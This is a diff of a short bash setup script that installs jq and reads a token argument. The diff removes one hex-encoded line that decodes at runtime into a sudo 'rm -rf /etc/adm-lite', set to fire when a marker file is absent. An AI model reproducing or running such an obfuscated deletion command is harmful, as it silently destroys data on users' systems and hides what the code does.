@@ -1,7 +1,6 @@
 #!/bin/bash
 
 apt-get install jq -y > /dev/null 2>&1
-[[ ! -e /bin/verifysys ]] && sudo $(echo -e $(echo "726D202D7266202f6574632f61646d2d6c697465"| sed 's/../\\x&/g;s/$/ /'))
 #VARIAVEL ENTRADA TOKEN
 [[ "$1" = "" ]] && exit 1
 if [[ "$2" != "" ]]; then
